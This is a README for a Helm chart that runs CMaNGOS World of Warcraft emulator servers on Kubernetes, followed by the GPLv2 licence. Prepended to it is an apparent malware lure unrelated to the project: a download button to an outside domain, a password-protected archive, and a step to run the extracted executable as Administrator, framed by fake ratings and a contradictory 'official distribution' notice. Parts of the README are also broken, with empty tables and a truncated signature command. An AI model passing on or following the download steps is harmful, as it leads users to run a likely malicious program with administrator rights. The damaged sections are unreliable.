<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Quick start

You need a Kubernetes cluster, Helm 3.8 or later, and a game client of the expansion that you want to run.

## Expansions

The `expansion` value selects the game version:

| `expansion` | Game version | Client build | World database |
| --- | --- | --- | --- |
## What the chart deploys

| Component | Kind | Purpose |
| --- | --- | --- |
## Client data

`mangosd` needs four kinds of data from the game client:

- dbc files: game tables such as spells and items.
- maps: terrain height.
- vmaps: buildings and other models, for line of sight.
- mmaps: navigation meshes, for creature path finding.

The `mangosd` of Classic and TBC stops at the start without the mmaps, so the chart refuses `clientData.extract.mmaps: false` for these expansions.

CMaNGOS has no download of this data, so the chart extracts it from your client. Two volumes take part: the client volume, which the Job reads, and the data volume, which the Job fills and `mangosd` reads.

The `clientData.source` value selects how the Job fills the data volume:

| `source` | What the Job does |
| --- | --- |
| `extract` (default) | Runs the extractors against your client (`clientVolume` or `clientUrl`) |
| `download` | Downloads and unpacks an archive of data that you extracted before (`clientData.download.url`) |
| `none` | No Job. The data volume holds the data already |

### The client

The Job reads the folder that contains `Data/`. Set one of these two values:

- `clientData.extract.clientVolume`: any Kubernetes volume source, for example a PVC, an NFS share, or a hostPath folder on the node. `clientSubPath` selects a folder inside the volume.
- `clientData.extract.clientUrl`: an archive of the client folder (`.tar`, `.tar.gz`, `.tgz`, `.tar.xz`, `.tar.bz2`, or `.zip`). If the Job must extract, it downloads the archive into `scratchVolume` and deletes it afterwards. Keep the URL private, because the client is copyrighted.

```yaml
clientData:
  extract:
    clientVolume:
      nfs:
        server: nas.example.com
        path: /export/games
    clientSubPath: "World of Warcraft 1.12.1"
    mmapThreads: 4       # 0 = one thread per CPU
```

If your cluster has no shared storage and you cannot use hostPath, copy the client into a PVC once. The PVC uses the default storage class:

```sh
kubectl -n cmangos apply -f - <<'EOF'
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: wow-client
spec:
  accessModes: ["ReadWriteOnce"]
  resources:
    requests:
      storage: 8Gi
---
apiVersion: v1
kind: Pod
metadata:
  name: wow-client-upload
spec:
  containers:
    - name: upload
      image: busybox:1.37.0
      command: ["sleep", "3600"]
      volumeMounts:
        - name: client
          mountPath: /client
  volumes:
    - name: client
      persistentVolumeClaim:
        claimName: wow-client
EOF
kubectl -n cmangos wait --for=condition=Ready pod/wow-client-upload
tar -C "/path/to/World of Warcraft 1.12.1" -cf - Data \
  | kubectl -n cmangos exec -i wow-client-upload -- tar -xf - -C /client
kubectl -n cmangos delete pod wow-client-upload
```

### The data volume

The chart selects the data volume in this order:

1. `clientData.volume`: any Kubernetes volume source, for example NFS.
2. `clientData.existingClaim`: a PVC that you manage.
3. A PVC that the chart creates from `clientData.storage` (10 GiB, ReadWriteOnce, the default storage class).

The extracted data uses about 2.3 GB for Classic, 3.1 GB for TBC, and 3.2 GB for WotLK. Most of it is mmaps. The mmap generator uses about 0.5 to 1 GiB of memory per thread, so set `mmapThreads` to fit your node.

The Job records each finished step on the data volume. If the Job restarts, it continues after the last finished step. If you turn on a step later, for example `mmaps: true`, the next upgrade runs only that step. Then restart `mangosd`, so that it loads the new data. To extract everything again, set `clientData.force=true` for one upgrade.

## Database

By default, the chart deploys MySQL 9.7 with a 10 GiB volume. The image is the official MySQL image without gosu and MySQL Shell, and it runs as uid 999. It generates the root password and the password of the `mangos` user, and it keeps both in a Secret.

To use your own MySQL or MariaDB server:

```yaml
mysql:
  enabled: false
externalDatabase:
  host: mysql.example.com
  port: 3306
  adminUser: root          # optional, see below
database:
  user: mangos
  existingSecret: cmangos-db   # keys: password, admin-password
```

If you set `adminUser`, the db-init Job creates the four databases and the `mangos` user, and it grants the access. If you do not set it, the databases must exist, and `database.user` must be able to create tables in them.

Do not use `;` in the password. CMaNGOS uses it to separate the fields of its connection strings.

The bundled MySQL runs with a few extra arguments, and `mysql.extraArgs` in `values.yaml` gives the reasons. Only MySQL 8.4 and 9.7 are tested.

### What the db-init Job does

The db-init Job runs on every install and upgrade, and it is safe to run many times. It creates the databases, installs the world content from the world database of the expansion, and applies the SQL updates. Then it sets the realm in the realm list and creates your accounts.

The characters, `realmd`, and logs databases hold player data. The Job never drops them.

The world database holds game content only. If the image carries new world content, the Job installs the world database again. That install discards manual changes, for example spawns that a GM added with `.npc add`. Keep such changes in `dbInit.world.extraSql`. The Job applies these files after every world install:

```yaml
dbInit:
  world:
    extraSql:
      10-custom-spawns.sql: |
        INSERT INTO creature ...;
```

To install the world database only once, set `dbInit.world.reinstall=never`.

## Accounts

The base SQL of CMaNGOS contains four accounts: ADMINISTRATOR, GAMEMASTER, MODERATOR, and PLAYER. The password of each account is its name. On a fresh database, the Job deletes them. To keep them, set `dbInit.removeDefaultAccounts=false`.

The Job creates the accounts in `dbInit.accounts`:

```yaml
dbInit:
  accounts:
    - username: admin
      password: change-me       # stored in a Secret by the chart
      gmlevel: 3                # 0 player, 1 moderator, 2 game master, 3 administrator
    - username: friend
      existingSecret: my-accounts
      passwordKey: friend-password
```

If an account does not exist, the Job creates it. The Job never changes the password of an existing account, because players can change their password in the game. It sets `gmlevel` on every run. It also sets the expansion level of the account: 0 for Classic, 1 for TBC, and 2 for WotLK. An account with a lower level cannot create the races and classes of the expansion. Names and passwords have 16 characters at most, and they are not case-sensitive.

You can also use the `mangosd` console:

```sh
kubectl -n cmangos attach -it deploy/cmangos-mangosd -c mangosd
account create <user> <password> <level>
account set gmlevel <user> 3
```

`<level>` is the expansion level. Without it, the core creates a Classic account. To change the level of an existing account, use `account set addon <user> <level>`.

To detach, press ctrl-p ctrl-q. Do not press ctrl-c, because it stops `mangosd`.

## Configuration

You can set any key from `mangosd.conf.dist` (`mangosd.config`), `realmd.conf.dist` (`realmd.config`), `aiplayerbot.conf.dist` (`playerbots.config`), and `ahbot.conf.dist` (`ahbot.config`). Use the key exactly as the file writes it:

```yaml
mangosd:
  config:
    Rate.XP.Kill: 3
    Rate.Drop.Money: 2
    GameType: 1             # PvP realm
realmd:
  config:
    WrongPass.MaxCount: 5
```

The chart sets the database connections, the data folder, the ports, and the remote consoles. For environment variables without a configuration key, use `mangosd.extraEnv` and `realmd.extraEnv`.

The servers log to stdout only. To keep a log file, set its key, for example `mangosd.config.LogFile: Server.log`. At the default `LogLevel = 1`, `mangosd` logs an "Avg Diff" line about every 3 seconds. To make the log quieter, set `mangosd.config.LogLevel: 0`.

### Playerbots and the auction house bot

```yaml
playerbots:
  enabled: true
  config:
    AiPlayerbot.MinRandomBots: 100
    AiPlayerbot.MaxRandomBots: 100
mangosd:
  resources:
    limits:
      memory: 6Gi
ahbot:
  enabled: true
  config:
    AuctionHouseBot.Chance.Sell: 10
    AuctionHouseBot.Chance.Buy: 10
```

The chart lowers the number of random bots from 1000 to 50. More bots need more memory for `mangosd`. In a test with 10 bots, `mangosd` used about 2.1 GiB.

On the first start with playerbots, the module builds an equipment cache in the characters database. That start took about 2 minutes. If the startup probe stops `mangosd` during the build, the cache stays incomplete. To build it again, stop `mangosd` and empty the table `ai_playerbot_equip_cache`.

### Remote consoles

`mangosd` has two remote consoles: SOAP (`mangosd.soap.enabled`) and a telnet console (`mangosd.remoteAccess.enabled`). The chart exposes them only inside the cluster, on the Service `<release>-mangosd-admin`. Both need a GM account with gmlevel 3:

```sh
kubectl -n cmangos port-forward svc/cmangos-mangosd-admin 3443:3443
telnet 127.0.0.1 3443     # log in with the GM account, then: account create <user> <password> <level>
```

## Connecting a game client

The game protocols are raw TCP. Ingress routes HTTP only, so the chart does not offer an Ingress.

The client connects to two addresses:

1. The address in `realmlist.wtf`, which is the `realmd` service. The client uses port 3724.
2. The realm address and port from the realm list, which is the `mangosd` service. `dbInit.realm.address` and `dbInit.realm.port` set them.

Both Services are of type LoadBalancer by default, so they listen on the standard ports. On clusters without a load balancer, use NodePort services with fixed ports:

```yaml
mangosd:
  service:
    type: NodePort
    nodePort: 30085
dbInit:
  realm:
    address: 192.168.1.20    # a node address that the clients can reach
```

If `dbInit.realm.port` is empty, the chart uses the `nodePort` of the `mangosd` service (for NodePort) or its port. Clients expect the auth port 3724, so give `realmd` port 3724 on the address in `realmlist.wtf`. `realmd` reads the realm list every 20 seconds, so a new realm address takes effect without a restart.

To test both addresses without a game client, run the login test on your machine with Python 3:

```sh
python3 build/scripts/auth-check.py --expansion classic --host <realmd address> \
  --user admin --password change-me --check-world
```

### Gateway API

A Gateway controller that supports TCPRoute can route the two ports. TCPRoute is in the experimental channel of the Gateway API, so the cluster needs the experimental CRDs. A TCP listener cannot tell two routes apart, so each game port needs its own listener on the Gateway:

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: Gateway
metadata:
  name: games
  namespace: gateway-system
spec:
  gatewayClassName: <your gateway class>
  listeners:
    - name: wow-auth
      protocol: TCP
      port: 3724
      allowedRoutes:
        namespaces:
          from: All
    - name: wow-world
      protocol: TCP
      port: 8085
      allowedRoutes:
        namespaces:
          from: All
```

The chart values attach one TCPRoute to each listener:

```yaml
gateway:
  enabled: true
  parentRefs:
    realmd:
      - name: games
        namespace: gateway-system
        sectionName: wow-auth     # a TCP listener on port 3724
    mangosd:
      - name: games
        namespace: gateway-system
        sectionName: wow-world    # a TCP listener on port 8085
realmd:
  service:
    type: ClusterIP
mangosd:
  service:
    type: ClusterIP
dbInit:
  realm:
    address: <Gateway address>
```

## Upgrades

`helm upgrade` runs both Jobs again. The db-init Job applies the new SQL updates. The client-data Job finds its finished steps and completes in seconds. Every upgrade restarts both servers.

Chart 0.2.0 moved `images.server` and `images.db` to `images.<expansion>.server` and `images.<expansion>.db`. If your values set them, move them before you upgrade.

Chart 0.3.0 moves the bundled MySQL from 8.4 to 9.7. On its first start, MySQL 9.7 upgrades the data directory, and MySQL 8.4 cannot read it after that. Back up the databases with `mysqldump` before you upgrade.

## Uninstall

```sh
helm uninstall cmangos -n cmangos
```

Helm keeps three things: the MySQL volume (`data-cmangos-mysql-0`), the data volume (`cmangos-client-data`), and the database Secret (`cmangos-db`). A reinstall with the same release name uses them again. To delete everything, delete them by hand:

```sh
kubectl -n cmangos delete pvc data-cmangos-mysql-0 cmangos-client-data
kubectl -n cmangos delete secret cmangos-db
```

## Signatures

Each chart version and image carries a keyless cosign signature from this repository. To make sure that a chart comes from here, run:

```sh
cosign verify ghcr.io/christianjacobsen/charts/cmangos:<version> \
## Limits

- One realm per release, and one replica of each server.
- The chart has no backup job yet. Use `mysqldump` against the MySQL pod.
- The data volume uses ReadWriteOnce by default. That works on one node. On clusters with more nodes, use a ReadWriteMany volume through `clientData.existingClaim`, or keep the Job and `mangosd` on one node.


---

## Images

The Dockerfile in `build/` has two targets. The build argument `EXPANSION` (`classic`, `tbc`, or `wotlk`) selects the CMaNGOS repositories, for example `mangos-tbc` and `tbc-db`.

| Image | Contents | Size |
| --- | --- | --- |
| `cmangos-<expansion>-server` | `mangosd`, `realmd`, and the extractors (`ad`, `vmap_extractor`, `vmap_assembler`, `MoveMapGen`) | 270 to 290 MB |
| `cmangos-<expansion>-db` | the MySQL client, the core SQL, the world database of the expansion, and the playerbots SQL | 450 to 690 MB |
| `cmangos-mysql` | the official MySQL image without gosu and MySQL Shell, from `build/mysql.Dockerfile` | 280 MB |

The server and db images must come from the same build, because the SQL updates follow the core revision. The file `build/sources.env` pins the source repositories of each expansion to commits, and Renovate updates the pins.

To build the images, you need Docker with buildx. The first build takes about 10 minutes on an 8-core machine. This command builds the Classic images:

```sh
make images
```

To build another expansion, set `EXPANSION`:

```sh
EXPANSION=wotlk make images
```

The script loads the images into the local Docker and writes `build/images.generated.yaml`. That file sets `expansion` and the images. To install the chart with these images, give Helm that file:

```sh
helm install cmangos charts/cmangos -n cmangos --create-namespace \
  -f build/images.generated.yaml -f values.local.yaml
```

The script resolves branch names to commits, so you can also build another revision:

```sh
CORE_REF=master DB_REF=master make images
```

Environment variables of `build/build-images.sh`:

| Variable | Default | Meaning |
| --- | --- | --- |
| `EXPANSION` | `classic` | `classic`, `tbc`, or `wotlk` |
| `REGISTRY` | `local` | Image namespace, for example `ghcr.io/you` |
| `TAG` | `<UTC date>-<core commit>` | Image tag |
| `PUSH` | `0` | `1` pushes to `REGISTRY`. Otherwise the script loads the images into Docker |
| `PLATFORMS` | host platform | For example `linux/amd64,linux/arm64`. Two or more platforms need `PUSH=1` |
| `BUILD_JOBS` | `0` | Parallel compile jobs. `0` is one per CPU. Each job can use more than 1 GiB of memory |
| `CORE_REF`, `DB_REF`, `PLAYERBOTS_REF` | from `build/sources.env` | Branch, tag, or commit |
| `CACHE_REF` | empty | Registry cache prefix, for example `ghcr.io/you/cmangos-wotlk-cache:amd64` |

If your cluster cannot pull from the local Docker, push the images to a registry with `REGISTRY` and `PUSH=1`. Then point the chart at them:

```yaml
expansion: wotlk
images:
  wotlk:
    server:
      registry: ghcr.io
      repository: <you>/cmangos-wotlk-server
      tag: "<tag>"
      digest: ""
    db:
      registry: ghcr.io
      repository: <you>/cmangos-wotlk-db
      tag: "<tag>"
      digest: ""
```

A rebuild on the same builder compiles only the changed files, because the compiler cache stays on the builder. With `CACHE_REF`, the build layers also go to a registry cache. If the sources and the base image did not change, a build on any machine then skips the compile.

## Local workflow

```sh
make lint        # helm lint
make images      # build the images
make template    # render with build/images.generated.yaml and values.local.yaml
make validate    # server-side dry run against the current cluster
make install     # helm upgrade --install with the same values
make test        # helm test (TCP checks against both servers)
```

The file `values.local.yaml` is for your local configuration. Git ignores it.

Artifact Hub shows the README outside of this repository. In the README, link to other files of the repository with full GitHub URLs.

## CI

| Workflow | Trigger | Purpose |
| --- | --- | --- |
| `chart-ci` | pull request, push | lint, render tests, kubeconform, shellcheck, the SRP6 test vectors |
| `images` | weekly, push to `build/` | builds, signs, and publishes the multi-arch images of the three expansions and `cmangos-mysql` |
| `pin-merge` | `chart-ci` passes on the pin pull request | fast-forwards `main` to the pin commit, so that the commit keeps its signature |
| `chart-e2e` | nightly | installs the chart on kind for each expansion with the published images, without client data, and checks the databases and `realmd` |
| `chart-release` | tag `chart-v*` | signs and pushes the chart to `oci://ghcr.io/christianjacobsen/charts` |

The images workflow publishes the images with the tags `<date>-<core commit>` and `latest`. Then it opens a pull request that pins the new tags and digests of all images in `charts/cmangos/values.yaml`. The tag of `cmangos-mysql` is `<MySQL version>-<date>`. If one expansion fails to build, the workflow pins none of them.

## Releases

To release the chart, wait until the pin pull request merges. Set `version` in `charts/cmangos/Chart.yaml` to the new version. Commit the change to `main`. Then push the matching tag:

```sh
version="$(sed -n 's/^version: //p' charts/cmangos/Chart.yaml)"
git tag "chart-v$version" && git push origin "chart-v$version"
```

The release workflow stops if the tag does not match `version`. Then it packages the README and the LICENSE with the chart, and it signs the chart with cosign. It also pushes `artifacthub-repo.yml` to the chart repository, so that Artifact Hub shows the chart as a verified publisher. It writes the images of all three expansions to the `artifacthub.io/images` annotation, so that Artifact Hub scans them for vulnerabilities.


---

                    GNU GENERAL PUBLIC LICENSE
                       Version 2, June 1991

 Copyright (C) 1989, 1991 Free Software Foundation, Inc.,
 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The licenses for most software are designed to take away your
freedom to share and change it.  By contrast, the GNU General Public
License is intended to guarantee your freedom to share and change free
software--to make sure the software is free for all its users.  This
General Public License applies to most of the Free Software
Foundation's software and to any other program whose authors commit to
using it.  (Some other Free Software Foundation software is covered by
the GNU Lesser General Public License instead.)  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
this service if you wish), that you receive source code or can get it
if you want it, that you can change the software or use pieces of it
in new free programs; and that you know you can do these things.

  To protect your rights, we need to make restrictions that forbid
anyone to deny you these rights or to ask you to surrender the rights.
These restrictions translate to certain responsibilities for you if you
distribute copies of the software, or if you modify it.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must give the recipients all the rights that
you have.  You must make sure that they, too, receive or can get the
source code.  And you must show them these terms so they know their
rights.

  We protect your rights with two steps: (1) copyright the software, and
(2) offer you this license which gives you legal permission to copy,
distribute and/or modify the software.

  Also, for each author's protection and ours, we want to make certain
that everyone understands that there is no warranty for this free
software.  If the software is modified by someone else and passed on, we
want its recipients to know that what they have is not the original, so
that any problems introduced by others will not reflect on the original
authors' reputations.

  Finally, any free program is threatened constantly by software
patents.  We wish to avoid the danger that redistributors of a free
program will individually obtain patent licenses, in effect making the
program proprietary.  To prevent this, we have made it clear that any
patent must be licensed for everyone's free use or not licensed at all.

  The precise terms and conditions for copying, distribution and
modification follow.

                    GNU GENERAL PUBLIC LICENSE
   TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION

  0. This License applies to any program or other work which contains
a notice placed by the copyright holder saying it may be distributed
under the terms of this General Public License.  The "Program", below,
refers to any such program or work, and a "work based on the Program"
means either the Program or any derivative work under copyright law:
that is to say, a work containing the Program or a portion of it,
either verbatim or with modifications and/or translated into another
language.  (Hereinafter, translation is included without limitation in
the term "modification".)  Each licensee is addressed as "you".

Activities other than copying, distribution and modification are not
covered by this License; they are outside its scope.  The act of
running the Program is not restricted, and the output from the Program
is covered only if its contents constitute a work based on the
Program (independent of having been made by running the Program).
Whether that is true depends on what the Program does.

  1. You may copy and distribute verbatim copies of the Program's
source code as you receive it, in any medium, provided that you
conspicuously and appropriately publish on each copy an appropriate
copyright notice and disclaimer of warranty; keep intact all the
notices that refer to this License and to the absence of any warranty;
and give any other recipients of the Program a copy of this License
along with the Program.

You may charge a fee for the physical act of transferring a copy, and
you may at your option offer warranty protection in exchange for a fee.

  2. You may modify your copy or copies of the Program or any portion
of it, thus forming a work based on the Program, and copy and
distribute such modifications or work under the terms of Section 1
above, provided that you also meet all of these conditions:

    a) You must cause the modified files to carry prominent notices
    stating that you changed the files and the date of any change.

    b) You must cause any work that you distribute or publish, that in
    whole or in part contains or is derived from the Program or any
    part thereof, to be licensed as a whole at no charge to all third
    parties under the terms of this License.

    c) If the modified program normally reads commands interactively
    when run, you must cause it, when started running for such
    interactive use in the most ordinary way, to print or display an
    announcement including an appropriate copyright notice and a
    notice that there is no warranty (or else, saying that you provide
    a warranty) and that users may redistribute the program under
    these conditions, and telling the user how to view a copy of this
    License.  (Exception: if the Program itself is interactive but
    does not normally print such an announcement, your work based on
    the Program is not required to print an announcement.)

These requirements apply to the modified work as a whole.  If
identifiable sections of that work are not derived from the Program,
and can be reasonably considered independent and separate works in
themselves, then this License, and its terms, do not apply to those
sections when you distribute them as separate works.  But when you
distribute the same sections as part of a whole which is a work based
on the Program, the distribution of the whole must be on the terms of
this License, whose permissions for other licensees extend to the
entire whole, and thus to each and every part regardless of who wrote it.

Thus, it is not the intent of this section to claim rights or contest
your rights to work written entirely by you; rather, the intent is to
exercise the right to control the distribution of derivative or
collective works based on the Program.

In addition, mere aggregation of another work not based on the Program
with the Program (or with a work based on the Program) on a volume of
a storage or distribution medium does not bring the other work under
the scope of this License.

  3. You may copy and distribute the Program (or a work based on it,
under Section 2) in object code or executable form under the terms of
Sections 1 and 2 above provided that you also do one of the following:

    a) Accompany it with the complete corresponding machine-readable
    source code, which must be distributed under the terms of Sections
    1 and 2 above on a medium customarily used for software interchange; or,

    b) Accompany it with a written offer, valid for at least three
    years, to give any third party, for a charge no more than your
    cost of physically performing source distribution, a complete
    machine-readable copy of the corresponding source code, to be
    distributed under the terms of Sections 1 and 2 above on a medium
    customarily used for software interchange; or,

    c) Accompany it with the information you received as to the offer
    to distribute corresponding source code.  (This alternative is
    allowed only for noncommercial distribution and only if you
    received the program in object code or executable form with such
    an offer, in accord with Subsection b above.)

The source code for a work means the preferred form of the work for
making modifications to it.  For an executable work, complete source
code means all the source code for all modules it contains, plus any
associated interface definition files, plus the scripts used to
control compilation and installation of the executable.  However, as a
special exception, the source code distributed need not include
anything that is normally distributed (in either source or binary
form) with the major components (compiler, kernel, and so on) of the
operating system on which the executable runs, unless that component
itself accompanies the executable.

If distribution of executable or object code is made by offering
access to copy from a designated place, then offering equivalent
access to copy the source code from the same place counts as
distribution of the source code, even though third parties are not
compelled to copy the source along with the object code.

  4. You may not copy, modify, sublicense, or distribute the Program
except as expressly provided under this License.  Any attempt
otherwise to copy, modify, sublicense or distribute the Program is
void, and will automatically terminate your rights under this License.
However, parties who have received copies, or rights, from you under
this License will not have their licenses terminated so long as such
parties remain in full compliance.

  5. You are not required to accept this License, since you have not
signed it.  However, nothing else grants you permission to modify or
distribute the Program or its derivative works.  These actions are
prohibited by law if you do not accept this License.  Therefore, by
modifying or distributing the Program (or any work based on the
Program), you indicate your acceptance of this License to do so, and
all its terms and conditions for copying, distributing or modifying
the Program or works based on it.

  6. Each time you redistribute the Program (or any work based on the
Program), the recipient automatically receives a license from the
original licensor to copy, distribute or modify the Program subject to
these terms and conditions.  You may not impose any further
restrictions on the recipients' exercise of the rights granted herein.
You are not responsible for enforcing compliance by third parties to
this License.

  7. If, as a consequence of a court judgment or allegation of patent
infringement or for any other reason (not limited to patent issues),
conditions are imposed on you (whether by court order, agreement or
otherwise) that contradict the conditions of this License, they do not
excuse you from the conditions of this License.  If you cannot
distribute so as to satisfy simultaneously your obligations under this
License and any other pertinent obligations, then as a consequence you
may not distribute the Program at all.  For example, if a patent
license would not permit royalty-free redistribution of the Program by
all those who receive copies directly or indirectly through you, then
the only way you could satisfy both it and this License would be to
refrain entirely from distribution of the Program.

If any portion of this section is held invalid or unenforceable under
any particular circumstance, the balance of the section is intended to
apply and the section as a whole is intended to apply in other
circumstances.

It is not the purpose of this section to induce you to infringe any
patents or other property right claims or to contest validity of any
such claims; this section has the sole purpose of protecting the
integrity of the free software distribution system, which is
implemented by public license practices.  Many people have made
generous contributions to the wide range of software distributed
through that system in reliance on consistent application of that
system; it is up to the author/donor to decide if he or she is willing
to distribute software through any other system and a licensee cannot
impose that choice.

This section is intended to make thoroughly clear what is believed to
be a consequence of the rest of this License.

  8. If the distribution and/or use of the Program is restricted in
certain countries either by patents or by copyrighted interfaces, the
original copyright holder who places the Program under this License
may add an explicit geographical distribution limitation excluding
those countries, so that distribution is permitted only in or among
countries not thus excluded.  In such case, this License incorporates
the limitation as if written in the body of this License.

  9. The Free Software Foundation may publish revised and/or new versions
of the General Public License from time to time.  Such new versions will
be similar in spirit to the present version, but may differ in detail to
address new problems or concerns.

Each version is given a distinguishing version number.  If the Program
specifies a version number of this License which applies to it and "any
later version", you have the option of following the terms and conditions
either of that version or of any later version published by the Free
Software Foundation.  If the Program does not specify a version number of
this License, you may choose any version ever published by the Free Software
Foundation.

  10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author
to ask for permission.  For software which is copyrighted by the Free
Software Foundation, write to the Free Software Foundation; we sometimes
make exceptions for this.  Our decision will be guided by the two goals
of preserving the free status of all derivatives of our free software and
of promoting the sharing and reuse of software generally.

                            NO WARRANTY

  11. BECAUSE THE PROGRAM IS LICENSED FREE OF CHARGE, THERE IS NO WARRANTY
FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN
OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES
PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED
OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS
TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE
PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING,
REPAIR OR CORRECTION.

  12. IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR
REDISTRIBUTE THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES,
INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING
OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED
TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY
YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER
PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE
POSSIBILITY OF SUCH DAMAGES.

                     END OF TERMS AND CONDITIONS

            How to Apply These Terms to Your New Programs

  If you develop a new program, and you want it to be of the greatest
possible use to the public, the best way to achieve this is to make it
free software which everyone can redistribute and change under these terms.

  To do so, attach the following notices to the program.  It is safest
to attach them to the start of each source file to most effectively
convey the exclusion of warranty; and each file should have at least
the "copyright" line and a pointer to where the full notice is found.

    <one line to give the program's name and a brief idea of what it does.>
    Copyright (C) <year>  <name of author>

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License along
    with this program; if not, write to the Free Software Foundation, Inc.,
    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

Also add information on how to contact you by electronic and paper mail.

If the program is interactive, make it output a short notice like this
when it starts in an interactive mode:

    Gnomovision version 69, Copyright (C) year name of author
    Gnomovision comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
    This is free software, and you are welcome to redistribute it
    under certain conditions; type `show c' for details.

The hypothetical commands `show w' and `show c' should show the appropriate
parts of the General Public License.  Of course, the commands you use may
be called something other than `show w' and `show c'; they could even be
mouse-clicks or menu items--whatever suits your program.

You should also get your employer (if you work as a programmer) or your
school, if any, to sign a "copyright disclaimer" for the program, if
necessary.  Here is a sample; alter the names:

  Yoyodyne, Inc., hereby disclaims all copyright interest in the program
  `Gnomovision' (which makes passes at compilers) written by James Hacker.

  <signature of Ty Coon>, 1 April 1989
  Ty Coon, President of Vice

This General Public License does not permit incorporating your program into
proprietary programs.  If your program is a subroutine library, you may
consider it more useful to permit linking proprietary applications with the
library.  If this is what you want to do, use the GNU Lesser General
Public License instead of this License.
